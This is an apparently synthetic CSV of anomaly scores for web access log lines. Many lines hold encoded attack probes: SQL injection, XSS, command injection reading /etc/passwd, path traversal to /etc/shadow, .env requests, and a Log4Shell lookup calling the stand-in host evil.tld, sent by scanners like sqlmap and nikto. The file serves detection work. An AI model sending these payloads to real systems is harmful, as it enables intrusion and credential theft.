score_content,score_session,score_fused,score_fused_norm,line
25.827564239501953,,25.827564239501953,25.827564239501953,41.50.30.118 - - [10/Jan/2025:12:32:08 +0000] "DELETE /.env HTTP/1.1" 200 13308 "https://example.com/" "dirb/2.22"
4.767812252044678,,4.767812252044678,4.767812252044678,195.209.111.149 - - [10/Jan/2025:12:32:09 +0000] "POST /logout HTTP/1.1" 204 8651 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
0.25462815165519714,,0.25462815165519714,0.25462815165519714,64.116.74.227 - - [10/Jan/2025:12:32:12 +0000] "GET /assets/app.js HTTP/1.1" 200 14779 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
30140.998046875,,30140.998046875,30140.998046875,53.134.182.21 - - [10/Jan/2025:12:32:14 +0000] "GET /assets/app.js HTTP/1.1" 429 988 "-" "dirb/2.22"
69.43315887451172,,69.43315887451172,69.43315887451172,137.174.244.176 - - [10/Jan/2025:12:32:15 +0000] "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 4756 "https://www.google.com/" "nikto/2.5.0"
49.64353942871094,,49.64353942871094,49.64353942871094,236.14.60.114 - - [10/Jan/2025:12:32:16 +0000] "DELETE /search?q=router HTTP/1.1" 200 13894 "https://twitter.com/" "nikto/2.5.0"
95.09793090820312,,95.09793090820312,95.09793090820312,40.71.190.23 - - [10/Jan/2025:12:32:18 +0000] "OPTIONS /search?q=ssd HTTP/1.1" 200 8207 "-" "sqlmap/1.7.2#stable"
4.69788122177124,,4.69788122177124,4.69788122177124,8.157.103.162 - - [10/Jan/2025:12:32:20 +0000] "POST /dashboard HTTP/1.1" 200 17916 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.24171675741672516,,0.24171675741672516,0.24171675741672516,176.89.247.226 - - [10/Jan/2025:12:32:23 +0000] "GET /assets/app.css HTTP/1.1" 200 19226 "https://news.ycombinator.com/" "nikto/2.5.0"
72.70437622070312,,72.70437622070312,72.70437622070312,229.236.16.238 - - [10/Jan/2025:12:32:24 +0000] "OPTIONS /contact HTTP/1.1" 200 11717 "https://example.com/" "sqlmap/1.7.2#stable"
69.37244415283203,,69.37244415283203,69.37244415283203,7.239.21.201 - - [10/Jan/2025:12:32:24 +0000] "HEAD /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 18860 "https://twitter.com/" "sqlmap/1.7.2#stable"
95.06271362304688,,95.06271362304688,95.06271362304688,188.132.79.46 - - [10/Jan/2025:12:32:24 +0000] "OPTIONS /search?q=phone HTTP/1.1" 200 13145 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
2.011080503463745,,2.011080503463745,2.011080503463745,235.244.19.211 - - [10/Jan/2025:12:32:27 +0000] "GET /profile HTTP/1.1" 200 1061 "https://www.google.com/" "sqlmap/1.7.2#stable"
0.23477883636951447,,0.23477883636951447,0.23477883636951447,106.156.87.92 - - [10/Jan/2025:12:32:27 +0000] "GET /assets/app.js HTTP/1.1" 200 8247 "https://www.google.com/" "nikto/2.5.0"
69.53479766845703,,69.53479766845703,69.53479766845703,171.211.182.227 - - [10/Jan/2025:12:32:30 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 12368 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.3791446685791,,27.3791446685791,27.3791446685791,33.72.187.66 - - [10/Jan/2025:12:32:32 +0000] "DELETE /about HTTP/1.1" 200 9781 "https://example.com/" "nikto/2.5.0"
30.142454147338867,,30.142454147338867,30.142454147338867,172.105.68.218 - - [10/Jan/2025:12:32:34 +0000] "POST /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 301 340 "-" "nikto/2.5.0"
47.098880767822266,,47.098880767822266,47.098880767822266,193.219.168.205 - - [10/Jan/2025:12:32:34 +0000] "HEAD /api/products HTTP/1.1" 200 9067 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.23625111579895,,3.23625111579895,3.23625111579895,7.9.230.201 - - [10/Jan/2025:12:32:34 +0000] "GET /index.html HTTP/1.1" 304 9056 "https://news.ycombinator.com/" "dirb/2.22"
72.39566040039062,,72.39566040039062,72.39566040039062,153.115.142.70 - - [10/Jan/2025:12:32:35 +0000] "HEAD /search?q=phone HTTP/1.1" 302 17212 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
126.18278503417969,,126.18278503417969,126.18278503417969,24.89.201.205 - - [10/Jan/2025:12:32:38 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 16669 "https://news.ycombinator.com/" "python-requests/2.31.0"
13.10195541381836,,13.10195541381836,13.10195541381836,17.13.91.40 - - [10/Jan/2025:12:32:38 +0000] "PUT /api/products HTTP/1.1" 201 3940 "https://twitter.com/" "sqlmap/1.7.2#stable"
13.194864273071289,,13.194864273071289,13.194864273071289,240.130.185.230 - - [10/Jan/2025:12:32:41 +0000] "PUT /logout HTTP/1.1" 200 6418 "https://example.com/" "curl/7.85.0"
126.31423950195312,,126.31423950195312,126.31423950195312,192.73.37.129 - - [10/Jan/2025:12:32:44 +0000] "TRACE /search?q=camera HTTP/1.1" 200 17562 "https://example.com/" "sqlmap/1.7.2#stable"
2.0971591472625732,,2.0971591472625732,2.0971591472625732,150.63.148.226 - - [10/Jan/2025:12:32:45 +0000] "GET /login HTTP/1.1" 200 9735 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
104.00507354736328,,104.00507354736328,104.00507354736328,101.3.46.248 - - [10/Jan/2025:12:32:46 +0000] "TRACE /about HTTP/1.1" 204 1783 "https://www.google.com/" "nikto/2.5.0"
72.7124252319336,,72.7124252319336,72.7124252319336,19.39.82.111 - - [10/Jan/2025:12:32:49 +0000] "OPTIONS /profile HTTP/1.1" 200 14512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
126.29041290283203,,126.29041290283203,126.29041290283203,51.49.251.145 - - [10/Jan/2025:12:32:50 +0000] "TRACE /search?q=router HTTP/1.1" 200 9289 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
95.05054473876953,,95.05054473876953,95.05054473876953,237.19.181.227 - - [10/Jan/2025:12:32:53 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 17014 "https://example.com/" "nikto/2.5.0"
0.2970176339149475,,0.2970176339149475,0.2970176339149475,37.122.104.22 - - [10/Jan/2025:12:32:56 +0000] "GET /index.html HTTP/1.1" 204 3737 "https://twitter.com/" "curl/7.85.0"
0.30020734667778015,,0.30020734667778015,0.30020734667778015,7.206.25.90 - - [10/Jan/2025:12:32:59 +0000] "GET /index.html HTTP/1.1" 201 2396 "https://example.com/" "python-requests/2.31.0"
49.65153503417969,,49.65153503417969,49.65153503417969,17.66.113.87 - - [10/Jan/2025:12:32:59 +0000] "DELETE /search?q=laptop HTTP/1.1" 200 16840 "https://news.ycombinator.com/" "python-requests/2.31.0"
3.2384490966796875,,3.2384490966796875,3.2384490966796875,32.30.231.195 - - [10/Jan/2025:12:33:01 +0000] "GET /index.html HTTP/1.1" 304 9738 "https://news.ycombinator.com/" "python-requests/2.31.0"
30140.048828125,,30140.048828125,30140.048828125,48.13.79.110 - - [10/Jan/2025:12:33:03 +0000] "GET /index.html HTTP/1.1" 404 161 "https://twitter.com/" "dirb/2.22"
35.350765228271484,,35.350765228271484,35.350765228271484,113.186.105.71 - - [10/Jan/2025:12:33:05 +0000] "PUT /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 5245 "https://www.google.com/" "nikto/2.5.0"
126.19872283935547,,126.19872283935547,126.19872283935547,199.193.151.73 - - [10/Jan/2025:12:33:06 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 3838 "https://news.ycombinator.com/" "nikto/2.5.0"
30144.255859375,,30144.255859375,30144.255859375,203.71.223.163 - - [10/Jan/2025:12:33:08 +0000] "POST /profile HTTP/1.1" 401 1234 "https://www.google.com/" "sqlmap/1.7.2#stable"
106.72854614257812,,106.72854614257812,106.72854614257812,52.251.105.121 - - [10/Jan/2025:12:33:09 +0000] "TRACE /phpmyadmin HTTP/1.1" 302 5111 "-" "curl/7.85.0"
11029.787109375,,11029.787109375,11029.787109375,108.165.123.24 - - [10/Jan/2025:12:33:12 +0000] "GET /index.html HTTP/1.1" 500 1104 "https://example.com/" "nikto/2.5.0"
95.08049011230469,,95.08049011230469,95.08049011230469,108.92.177.244 - - [10/Jan/2025:12:33:14 +0000] "OPTIONS /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 10105 "https://news.ycombinator.com/" "curl/7.85.0"
2.317392110824585,,2.317392110824585,2.317392110824585,180.35.225.18 - - [10/Jan/2025:12:33:17 +0000] "GET / HTTP/1.1" 200 11485 "https://www.google.com/" "curl/7.85.0"
2.0167479515075684,,2.0167479515075684,2.0167479515075684,121.109.185.147 - - [10/Jan/2025:12:33:17 +0000] "GET /contact HTTP/1.1" 200 7813 "https://www.google.com/" "sqlmap/1.7.2#stable"
69.34323120117188,,69.34323120117188,69.34323120117188,39.100.34.115 - - [10/Jan/2025:12:33:17 +0000] "HEAD /search?q=%27+OR+1%3D1+-- HTTP/1.1" 201 9262 "https://example.com/" "sqlmap/1.7.2#stable"
126.26638793945312,,126.26638793945312,126.26638793945312,82.21.252.10 - - [10/Jan/2025:12:33:17 +0000] "TRACE /search?q=monitor HTTP/1.1" 200 8384 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
126.49597930908203,,126.49597930908203,126.49597930908203,12.18.221.18 - - [10/Jan/2025:12:33:19 +0000] "TRACE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 13496 "https://news.ycombinator.com/" "curl/7.85.0"
104.0176010131836,,104.0176010131836,104.0176010131836,64.222.232.136 - - [10/Jan/2025:12:33:19 +0000] "TRACE /login HTTP/1.1" 200 5761 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.097143173217773,,27.097143173217773,27.097143173217773,167.2.231.77 - - [10/Jan/2025:12:33:21 +0000] "POST /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 1860 "https://www.google.com/" "dirb/2.22"
4.898508071899414,,4.898508071899414,4.898508071899414,39.59.76.71 - - [10/Jan/2025:12:33:21 +0000] "GET /profile HTTP/1.1" 301 16517 "https://example.com/" "python-requests/2.31.0"
75.71707153320312,,75.71707153320312,75.71707153320312,10.181.238.171 - - [10/Jan/2025:12:33:22 +0000] "OPTIONS /about HTTP/1.1" 304 17525 "https://www.google.com/" "dirb/2.22"
72.66893005371094,,72.66893005371094,72.66893005371094,146.62.125.183 - - [10/Jan/2025:12:33:23 +0000] "OPTIONS /api/products HTTP/1.1" 204 18275 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.21675682067871094,,0.21675682067871094,0.21675682067871094,8.108.242.167 - - [10/Jan/2025:12:33:26 +0000] "GET /assets/app.css HTTP/1.1" 200 10234 "https://twitter.com/" "python-requests/2.31.0"
95.111572265625,,95.111572265625,95.111572265625,184.174.212.241 - - [10/Jan/2025:12:33:27 +0000] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 1487 "https://news.ycombinator.com/" "nikto/2.5.0"
69.54466247558594,,69.54466247558594,69.54466247558594,8.99.60.23 - - [10/Jan/2025:12:33:27 +0000] "HEAD /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 16241 "https://news.ycombinator.com/" "curl/7.85.0"
27.291780471801758,,27.291780471801758,27.291780471801758,71.116.78.158 - - [10/Jan/2025:12:33:29 +0000] "DELETE /profile HTTP/1.1" 200 5767 "https://www.google.com/" "curl/7.85.0"
2.2917540073394775,,2.2917540073394775,2.2917540073394775,124.229.208.108 - - [10/Jan/2025:12:33:32 +0000] "GET / HTTP/1.1" 200 3238 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.476001739501953,,24.476001739501953,24.476001739501953,179.63.155.61 - - [10/Jan/2025:12:33:32 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 19987 "https://www.google.com/" "nikto/2.5.0"
126.28095245361328,,126.28095245361328,126.28095245361328,156.154.84.153 - - [10/Jan/2025:12:33:32 +0000] "TRACE /search?q=monitor HTTP/1.1" 200 13069 "https://example.com/" "curl/7.85.0"
13.229825019836426,,13.229825019836426,13.229825019836426,240.214.1.118 - - [10/Jan/2025:12:33:32 +0000] "PUT /logout HTTP/1.1" 200 18211 "https://www.google.com/" "curl/7.85.0"
70.76583099365234,,70.76583099365234,70.76583099365234,116.33.168.241 - - [10/Jan/2025:12:33:33 +0000] "OPTIONS /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 14114 "-" "sqlmap/1.7.2#stable"
69.45879364013672,,69.45879364013672,69.45879364013672,205.82.216.144 - - [10/Jan/2025:12:33:34 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 10983 "https://news.ycombinator.com/" "dirb/2.22"
35.45668029785156,,35.45668029785156,35.45668029785156,86.245.231.75 - - [10/Jan/2025:12:33:37 +0000] "PUT /search?q=monitor HTTP/1.1" 200 4546 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.861604690551758,,4.861604690551758,4.861604690551758,136.119.123.187 - - [10/Jan/2025:12:33:39 +0000] "GET /contact HTTP/1.1" 301 4458 "https://www.google.com/" "python-requests/2.31.0"
126.29553985595703,,126.29553985595703,126.29553985595703,172.199.68.49 - - [10/Jan/2025:12:33:39 +0000] "TRACE /search?q=router HTTP/1.1" 201 11579 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
69.45946502685547,,69.45946502685547,69.45946502685547,14.107.35.245 - - [10/Jan/2025:12:33:41 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 4700 "-" "python-requests/2.31.0"
102.49109649658203,,102.49109649658203,102.49109649658203,253.35.93.211 - - [10/Jan/2025:12:33:41 +0000] "TRACE /.env HTTP/1.1" 200 18607 "https://twitter.com/" "nikto/2.5.0"
27.0861759185791,,27.0861759185791,27.0861759185791,109.48.237.41 - - [10/Jan/2025:12:33:41 +0000] "POST /search?q=phone HTTP/1.1" 200 8598 "https://twitter.com/" "nikto/2.5.0"
104.0380630493164,,104.0380630493164,104.0380630493164,201.61.82.87 - - [10/Jan/2025:12:33:44 +0000] "TRACE /login HTTP/1.1" 200 12198 "-" "dirb/2.22"
2.291231393814087,,2.291231393814087,2.291231393814087,120.254.154.10 - - [10/Jan/2025:12:33:47 +0000] "GET / HTTP/1.1" 200 2848 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
27.395496368408203,,27.395496368408203,27.395496368408203,116.146.8.2 - - [10/Jan/2025:12:33:48 +0000] "DELETE /login HTTP/1.1" 200 15340 "https://www.google.com/" "sqlmap/1.7.2#stable"
126.32746124267578,,126.32746124267578,126.32746124267578,165.252.229.214 - - [10/Jan/2025:12:33:48 +0000] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 1191 "https://www.google.com/" "nikto/2.5.0"
69.466796875,,69.466796875,69.466796875,160.207.223.205 - - [10/Jan/2025:12:33:49 +0000] "HEAD /search?q=camera HTTP/1.1" 200 6952 "-" "curl/7.85.0"
7.53021240234375,,7.53021240234375,7.53021240234375,176.105.208.152 - - [10/Jan/2025:12:33:52 +0000] "POST /dashboard HTTP/1.1" 301 9682 "https://example.com/" "dirb/2.22"
0.3189816474914551,,0.3189816474914551,0.3189816474914551,34.152.192.170 - - [10/Jan/2025:12:33:53 +0000] "GET /index.html HTTP/1.1" 200 8480 "https://news.ycombinator.com/" "nikto/2.5.0"
24.324434280395508,,24.324434280395508,24.324434280395508,238.174.112.101 - - [10/Jan/2025:12:33:55 +0000] "GET /search?q=monitor HTTP/1.1" 200 8925 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
0.24296441674232483,,0.24296441674232483,0.24296441674232483,230.5.202.73 - - [10/Jan/2025:12:33:57 +0000] "GET /assets/app.js HTTP/1.1" 200 10797 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.122551918029785,,2.122551918029785,2.122551918029785,52.10.205.154 - - [10/Jan/2025:12:33:59 +0000] "GET /login HTTP/1.1" 200 18757 "https://twitter.com/" "nikto/2.5.0"
30152.748046875,,30152.748046875,30152.748046875,157.142.221.138 - - [10/Jan/2025:12:34:01 +0000] "PUT /dashboard HTTP/1.1" 404 779 "https://example.com/" "python-requests/2.31.0"
4.813262462615967,,4.813262462615967,4.813262462615967,114.73.254.68 - - [10/Jan/2025:12:34:01 +0000] "POST /about HTTP/1.1" 200 8850 "https://www.google.com/" "nikto/2.5.0"
3.1374480724334717,,3.1374480724334717,3.1374480724334717,9.166.46.224 - - [10/Jan/2025:12:34:03 +0000] "GET /assets/app.js HTTP/1.1" 302 369 "https://twitter.com/" "curl/7.85.0"
52.53073501586914,,52.53073501586914,52.53073501586914,88.243.102.20 - - [10/Jan/2025:12:34:05 +0000] "DELETE /search?q=laptop HTTP/1.1" 302 18312 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
72.71996307373047,,72.71996307373047,72.71996307373047,173.67.25.201 - - [10/Jan/2025:12:34:08 +0000] "OPTIONS /profile HTTP/1.1" 200 17353 "https://twitter.com/" "dirb/2.22"
3.142009735107422,,3.142009735107422,3.142009735107422,200.171.18.160 - - [10/Jan/2025:12:34:11 +0000] "GET /assets/app.js HTTP/1.1" 304 1119 "https://example.com/" "nikto/2.5.0"
70.92367553710938,,70.92367553710938,70.92367553710938,171.196.141.88 - - [10/Jan/2025:12:34:12 +0000] "OPTIONS /wp-login.php HTTP/1.1" 200 5150 "-" "curl/7.85.0"
69.58831024169922,,69.58831024169922,69.58831024169922,57.171.30.80 - - [10/Jan/2025:12:34:13 +0000] "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 14012 "https://example.com/" "python-requests/2.31.0"
2.3198482990264893,,2.3198482990264893,2.3198482990264893,201.175.174.145 - - [10/Jan/2025:12:34:16 +0000] "GET / HTTP/1.1" 200 12302 "https://www.google.com/" "sqlmap/1.7.2#stable"
49.639198303222656,,49.639198303222656,49.639198303222656,132.29.27.37 - - [10/Jan/2025:12:34:16 +0000] "DELETE /search?q=phone HTTP/1.1" 200 5318 "https://www.google.com/" "sqlmap/1.7.2#stable"
35.48969650268555,,35.48969650268555,35.48969650268555,110.36.31.242 - - [10/Jan/2025:12:34:17 +0000] "PUT /search?q=monitor HTTP/1.1" 200 15161 "https://twitter.com/" "curl/7.85.0"
27.0581111907959,,27.0581111907959,27.0581111907959,180.84.40.149 - - [10/Jan/2025:12:34:20 +0000] "POST /search?q=monitor HTTP/1.1" 200 13740 "-" "dirb/2.22"
102.4765853881836,,102.4765853881836,102.4765853881836,173.176.82.23 - - [10/Jan/2025:12:34:20 +0000] "TRACE /.env HTTP/1.1" 204 15566 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.31972336769104,,2.31972336769104,2.31972336769104,66.155.133.103 - - [10/Jan/2025:12:34:21 +0000] "GET / HTTP/1.1" 200 12260 "https://www.google.com/" "curl/7.85.0"
95.0259017944336,,95.0259017944336,95.0259017944336,246.144.179.118 - - [10/Jan/2025:12:34:21 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 8603 "https://twitter.com/" "nikto/2.5.0"
35.52462387084961,,35.52462387084961,35.52462387084961,189.201.249.206 - - [10/Jan/2025:12:34:24 +0000] "PUT /api/product?id=123 HTTP/1.1" 200 2672 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.0764620304107666,,3.0764620304107666,3.0764620304107666,205.196.51.64 - - [10/Jan/2025:12:34:26 +0000] "GET /assets/app.css HTTP/1.1" 302 5446 "-" "Wget/1.21.2 (linux-gnu)"
4.807329177856445,,4.807329177856445,4.807329177856445,120.168.88.28 - - [10/Jan/2025:12:34:26 +0000] "POST /admin HTTP/1.1" 200 7061 "-" "sqlmap/1.7.2#stable"
35.49263381958008,,35.49263381958008,35.49263381958008,148.121.145.167 - - [10/Jan/2025:12:34:27 +0000] "PUT /search?q=router HTTP/1.1" 200 9088 "https://news.ycombinator.com/" "dirb/2.22"
126.3548812866211,,126.3548812866211,126.3548812866211,169.9.206.124 - - [10/Jan/2025:12:34:28 +0000] "TRACE /search?q=phone HTTP/1.1" 200 256 "-" "sqlmap/1.7.2#stable"
13.164379119873047,,13.164379119873047,13.164379119873047,20.98.196.223 - - [10/Jan/2025:12:34:29 +0000] "PUT /profile HTTP/1.1" 200 8138 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
72.72606658935547,,72.72606658935547,72.72606658935547,161.67.78.157 - - [10/Jan/2025:12:34:32 +0000] "OPTIONS /contact HTTP/1.1" 200 19822 "https://www.google.com/" "python-requests/2.31.0"
35.57975769042969,,35.57975769042969,35.57975769042969,15.92.112.170 - - [10/Jan/2025:12:34:35 +0000] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 5354 "https://twitter.com/" "python-requests/2.31.0"
102.4465103149414,,102.4465103149414,102.4465103149414,78.243.13.159 - - [10/Jan/2025:12:34:38 +0000] "TRACE /.env HTTP/1.1" 201 4277 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
49.62582778930664,,49.62582778930664,49.62582778930664,114.221.166.113 - - [10/Jan/2025:12:34:39 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 15105 "https://news.ycombinator.com/" "dirb/2.22"
30243.564453125,,30243.564453125,30243.564453125,45.230.88.152 - - [10/Jan/2025:12:34:40 +0000] "TRACE /dashboard HTTP/1.1" 404 436 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9602444171905518,,1.9602444171905518,1.9602444171905518,143.130.236.238 - - [10/Jan/2025:12:34:40 +0000] "GET /api/products HTTP/1.1" 200 1319 "https://twitter.com/" "dirb/2.22"
72.75492095947266,,72.75492095947266,72.75492095947266,27.85.109.114 - - [10/Jan/2025:12:34:41 +0000] "OPTIONS /logout HTTP/1.1" 200 16848 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
97.8685073852539,,97.8685073852539,97.8685073852539,74.248.206.123 - - [10/Jan/2025:12:34:43 +0000] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 301 12878 "https://www.google.com/" "nikto/2.5.0"
